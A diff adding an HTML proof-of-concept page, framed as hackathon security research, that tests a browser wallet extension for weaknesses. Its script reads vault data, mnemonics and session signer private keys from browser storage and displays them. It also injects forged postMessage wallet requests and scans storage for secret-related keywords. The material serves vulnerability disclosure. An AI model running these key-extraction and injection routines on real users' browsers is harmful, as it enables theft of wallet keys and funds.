@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verified Wallet Security PoC Tester</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      color: #e0e0e0;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    h1 {
+      color: #ff4757;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      text-align: center;
+      color: #888;
+      margin-bottom: 30px;
+    }
+    .warning {
+      background: rgba(255, 71, 87, 0.1);
+      border: 1px solid #ff4757;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    .test-card {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 15px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .test-card h3 {
+      margin-top: 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .severity {
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+    .critical { background: #ff4757; color: white; }
+    .high { background: #ffa502; color: black; }
+    .medium { background: #ffd43b; color: black; }
+    button {
+      background: linear-gradient(135deg, #603FF4 0%, #8b5cf6 100%);
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 15px rgba(96, 63, 244, 0.4);
+    }
+    button:disabled {
+      background: #444;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    .output {
+      background: #0d1117;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 15px;
+      font-family: 'Consolas', 'Monaco', monospace;
+      font-size: 13px;
+      white-space: pre-wrap;
+      max-height: 300px;
+      overflow-y: auto;
+      display: none;
+    }
+    .output.visible { display: block; }
+    .success { color: #26de81; }
+    .error { color: #ff4757; }
+    .info { color: #45aaf2; }
+    .warn { color: #ffa502; }
+    .account-info {
+      background: rgba(96, 63, 244, 0.1);
+      border: 1px solid #603FF4;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 20px;
+    }
+    .account-info code {
+      background: rgba(0,0,0,0.3);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔓 Verified Wallet Security PoC Tester</h1>
+    <p class="subtitle">Hackathon Security Research Tool</p>
+    
+    <div class="warning">
+      ⚠️ <strong>For Security Research Only</strong> - This page tests vulnerabilities in Verified Wallet Extension
+    </div>
+    
+    <div class="account-info">
+      <strong>Test Account:</strong> <code>0xEeefcE8Db6482Ca41Ef8E2dfde672F45860929ac</code><br>
+      <strong>Network:</strong> Base Sepolia (Chain ID: 84532)
+    </div>
+
+    <!-- PoC 1: localStorage Vault Leak -->
+    <div class="test-card">
+      <h3><span class="severity high">HIGH</span> localStorage Vault Data Leak</h3>
+      <p>Tests if vault data can be read from localStorage by any page script.</p>
+      <button onclick="runLocalStorageTest()">Run Test</button>
+      <div class="output" id="output-localstorage"></div>
+    </div>
+
+    <!-- PoC 2: Session Signer Keys -->
+    <div class="test-card">
+      <h3><span class="severity critical">CRITICAL</span> Session Signer Private Key Exposure</h3>
+      <p>Scans localStorage for Biconomy session signer private keys.</p>
+      <button onclick="runSessionSignerTest()">Run Test</button>
+      <div class="output" id="output-session"></div>
+    </div>
+
+    <!-- PoC 3: Message Injection -->
+    <div class="test-card">
+      <h3><span class="severity high">HIGH</span> Message Injection Test</h3>
+      <p>Attempts to inject wallet requests via postMessage.</p>
+      <button onclick="runMessageInjectionTest()">Run Test</button>
+      <div class="output" id="output-message"></div>
+    </div>
+
+    <!-- PoC 4: Request Wallet Connect -->
+    <div class="test-card">
+      <h3><span class="severity medium">MEDIUM</span> Wallet Connection Request</h3>
+      <p>Attempts to trigger eth_requestAccounts (will open popup if extension installed).</p>
+      <button onclick="runWalletConnectTest()">Run Test</button>
+      <div class="output" id="output-connect"></div>
+    </div>
+
+    <!-- PoC 5: Scan All Storage -->
+    <div class="test-card">
+      <h3><span class="severity high">HIGH</span> Full Storage Scan</h3>
+      <p>Scans all localStorage and sessionStorage for sensitive wallet data.</p>
+      <button onclick="runFullStorageScan()">Run Test</button>
+      <div class="output" id="output-fullscan"></div>
+    </div>
+  </div>
+
+  <script>
+    // Utility to log to output
+    function log(elementId, message, type = 'info') {
+      const output = document.getElementById(elementId);
+      output.classList.add('visible');
+      const span = document.createElement('span');
+      span.className = type;
+      span.textContent = message + '\n';
+      output.appendChild(span);
+      output.scrollTop = output.scrollHeight;
+    }
+
+    function clearOutput(elementId) {
+      const output = document.getElementById(elementId);
+      output.innerHTML = '';
+      output.classList.add('visible');
+    }
+
+    // PoC 1: localStorage Vault Leak
+    function runLocalStorageTest() {
+      clearOutput('output-localstorage');
+      log('output-localstorage', '🔓 Scanning localStorage for vault data...', 'info');
+      
+      const vaultData = localStorage.getItem('myVault');
+      
+      if (!vaultData) {
+        log('output-localstorage', '❌ No myVault data found.', 'warn');
+        log('output-localstorage', '   → Wallet may not be connected on this page', 'info');
+        return;
+      }
+      
+      try {
+        const parsed = JSON.parse(vaultData);
+        log('output-localstorage', '✅ VAULT DATA EXTRACTED!', 'success');
+        log('output-localstorage', '═'.repeat(50), 'info');
+        
+        const criticalFields = ['privateKey', 'pk', 'mnemonic', 'seed'];
+        const highFields = ['address', 'regAddress', 'hashedVaultId'];
+        const mediumFields = ['chainId', 'vaultId', 'channel'];
+        
+        log('output-localstorage', '🔴 CRITICAL FIELDS:', 'error');
+        criticalFields.forEach(field => {
+          if (parsed[field]) {
+            log('output-localstorage', `   💀 ${field}: ${String(parsed[field]).substring(0, 20)}...`, 'error');
+          }
+        });
+        
+        log('output-localstorage', '\n🟠 HIGH RISK FIELDS:', 'warn');
+        highFields.forEach(field => {
+          if (parsed[field]) {
+            log('output-localstorage', `   ⚠️ ${field}: ${parsed[field]}`, 'warn');
+          }
+        });
+        
+        log('output-localstorage', '\n🟡 MEDIUM RISK FIELDS:', 'info');
+        mediumFields.forEach(field => {
+          if (parsed[field]) {
+            log('output-localstorage', `   📋 ${field}: ${parsed[field]}`, 'info');
+          }
+        });
+        
+        log('output-localstorage', '\n📊 FULL VAULT:', 'info');
+        log('output-localstorage', JSON.stringify(parsed, null, 2), 'info');
+        
+      } catch (e) {
+        log('output-localstorage', `⚠️ Parse error: ${e.message}`, 'error');
+      }
+    }
+
+    // PoC 2: Session Signer Private Keys
+    function runSessionSignerTest() {
+      clearOutput('output-session');
+      log('output-session', '🔴 Scanning for session signer private keys...', 'error');
+      
+      let found = 0;
+      
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (!key) continue;
+        
+        if (key.endsWith('_signers')) {
+          log('output-session', `\n🎯 Found signer storage: ${key}`, 'warn');
+          
+          try {
+            const signersData = JSON.parse(localStorage.getItem(key));
+            
+            for (const [address, data] of Object.entries(signersData)) {
+              if (data.pvKey) {
+                found++;
+                log('output-session', `\n💀 PRIVATE KEY EXTRACTED!`, 'error');
+                log('output-session', `   Address: ${address}`, 'info');
+                log('output-session', `   Private Key: ${data.pvKey}`, 'error');
+              }
+            }
+          } catch (e) {
+            log('output-session', `   Error parsing: ${e.message}`, 'warn');
+          }
+        }
+        
+        if (key.endsWith('_sessions')) {
+          log('output-session', `\n📋 Found session storage: ${key}`, 'info');
+          
+          try {
+            const sessionData = JSON.parse(localStorage.getItem(key));
+            log('output-session', `   Merkle Root: ${sessionData.merkleRoot || 'None'}`, 'info');
+            log('output-session', `   Sessions: ${sessionData.leafNodes?.length || 0}`, 'info');
+          } catch (e) {}
+        }
+      }
+      
+      log('output-session', `\n${'═'.repeat(50)}`, 'info');
+      log('output-session', `📊 Total private keys extracted: ${found}`, found > 0 ? 'error' : 'success');
+      
+      if (found === 0) {
+        log('output-session', '✅ No session signer keys found (feature may not be in use)', 'success');
+      }
+    }
+
+    // PoC 3: Message Injection
+    function runMessageInjectionTest() {
+      clearOutput('output-message');
+      log('output-message', '🎯 Setting up message interceptor...', 'info');
+      
+      // Set up listener for responses
+      const handler = (event) => {
+        if (event.source !== window) return;
+        if (!event.data || !event.data.type) return;
+        
+        if (event.data.type === 'VW_RES') {
+          log('output-message', `\n📩 INTERCEPTED RESPONSE:`, 'success');
+          log('output-message', `   ID: ${event.data.id}`, 'info');
+          log('output-message', `   Success: ${event.data.params?.success}`, 'info');
+          log('output-message', `   Data: ${JSON.stringify(event.data.params?.data)}`, 'info');
+        }
+      };
+      
+      window.addEventListener('message', handler);
+      log('output-message', '✅ Interceptor active', 'success');
+      
+      // Inject test request
+      const messageId = Math.random().toString(36).substring(2);
+      log('output-message', `\n📤 Injecting eth_accounts request (ID: ${messageId})...`, 'warn');
+      
+      window.postMessage({
+        type: 'VW_REQ',
+        id: messageId,
+        params: {
+          method: 'eth_accounts'
+        }
+      }, '*');
+      
+      log('output-message', '⏳ Waiting for response (5 seconds)...', 'info');
+      
+      setTimeout(() => {
+        window.removeEventListener('message', handler);
+        log('output-message', '\n⏱️ Test completed. Check above for intercepted messages.', 'info');
+      }, 5000);
+    }
+
+    // PoC 4: Wallet Connect Request
+    function runWalletConnectTest() {
+      clearOutput('output-connect');
+      log('output-connect', '🔗 Attempting wallet connection...', 'info');
+      
+      if (window.verifiedwallet) {
+        log('output-connect', '✅ Verified Wallet provider detected!', 'success');
+        
+        window.verifiedwallet.request({ method: 'eth_accounts' })
+          .then(accounts => {
+            log('output-connect', `\n📊 Connected accounts: ${accounts.length}`, 'success');
+            accounts.forEach((acc, i) => {
+              log('output-connect', `   ${i + 1}. ${acc}`, 'info');
+            });
+          })
+          .catch(err => {
+            log('output-connect', `\n⚠️ Request failed: ${err.message}`, 'warn');
+          });
+          
+      } else if (window.ethereum) {
+        log('output-connect', '📋 Found window.ethereum (may be Verified Wallet)', 'info');
+        
+        window.ethereum.request({ method: 'eth_accounts' })
+          .then(accounts => {
+            log('output-connect', `\n📊 Accounts: ${JSON.stringify(accounts)}`, 'success');
+          })
+          .catch(err => {
+            log('output-connect', `\n⚠️ Error: ${err.message}`, 'warn');
+          });
+          
+      } else {
+        log('output-connect', '❌ No wallet provider found', 'error');
+        log('output-connect', '   → Install Verified Wallet extension and refresh', 'info');
+      }
+    }
+
+    // PoC 5: Full Storage Scan
+    function runFullStorageScan() {
+      clearOutput('output-fullscan');
+      log('output-fullscan', '🔍 Scanning ALL storage for sensitive data...', 'info');
+      
+      const sensitivePatterns = [
+        'vault', 'wallet', 'private', 'key', 'mnemonic', 'seed',
+        'account', 'address', 'signer', 'session', 'verified', 'custody',
+        'pk', 'secret', 'credential', 'passkey'
+      ];
+      
+      let findings = 0;
+      
+      // Scan localStorage
+      log('output-fullscan', '\n📦 localStorage:', 'info');
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (!key) continue;
+        
+        const keyLower = key.toLowerCase();
+        for (const pattern of sensitivePatterns) {
+          if (keyLower.includes(pattern)) {
+            findings++;
+            const value = localStorage.getItem(key);
+            const preview = value.length > 100 ? value.substring(0, 100) + '...' : value;
+            log('output-fullscan', `\n🎯 ${key}`, 'warn');
+            log('output-fullscan', `   ${preview}`, 'info');
+            break;
+          }
+        }
+      }
+      
+      // Scan sessionStorage
+      log('output-fullscan', '\n📦 sessionStorage:', 'info');
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        if (!key) continue;
+        
+        const keyLower = key.toLowerCase();
+        for (const pattern of sensitivePatterns) {
+          if (keyLower.includes(pattern)) {
+            findings++;
+            const value = sessionStorage.getItem(key);
+            const preview = value.length > 100 ? value.substring(0, 100) + '...' : value;
+            log('output-fullscan', `\n🎯 ${key}`, 'warn');
+            log('output-fullscan', `   ${preview}`, 'info');
+            break;
+          }
+        }
+      }
+      
+      log('output-fullscan', `\n${'═'.repeat(50)}`, 'info');
+      log('output-fullscan', `📊 Total sensitive items found: ${findings}`, findings > 0 ? 'warn' : 'success');
+    }
+  </script>
+</body>
+</html>
